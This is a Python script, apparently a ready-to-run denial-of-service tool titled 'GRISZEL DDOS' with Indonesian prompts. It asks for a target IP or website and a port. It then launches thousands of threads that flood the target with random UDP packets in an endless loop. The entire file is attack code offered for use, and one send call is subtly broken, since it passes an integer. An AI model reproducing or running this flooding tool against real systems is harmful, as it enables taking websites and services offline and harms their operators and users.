import random
import socket
import threading

print('''
░██████╗░██████╗░██╗░██████╗███████╗██╗░░░░░
██╔════╝░██╔══██╗██║██╔════╝╚════██║██║░░░░░
██║░░██╗░██████╔╝██║╚█████╗░░░███╔═╝██║░░░░░
██║░░╚██╗██╔══██╗██║░╚═══██╗██╔══╝░░██║░░░░░
╚██████╔╝██║░░██║██║██████╔╝███████╗███████╗
░╚═════╝░╚═╝░░╚═╝╚═╝╚═════╝░╚══════╝╚══════╝

██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░
''')
target_server = str(input("[ -> ] Ketikkan Alamat IP / Website target: "))
port_server = int(input("[ -> ] Masukkan Port target: "))
mengirim_request = int(input("[ -> ] Jumlah Request  (10000 - 175000): "))
mengirim_thread = int(input("[ -> ] Jumlah thread  (15000 - 95000): "))

def attack():
    urandom_disini = random._urandom(2080) 
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((target_server,port_server))
            s.send(urandom_disini)
            for x in range(mengirim_request):
                s.send(mengirim_thread)
            print("Berhasil mengirim serangan DoS ke", target_server, ", Melakukan serangan pada port", port_server)
        except:
            s.close()

for y in range(mengirim_thread):
    th = threading.Thread(target = attack)
    th.start()
    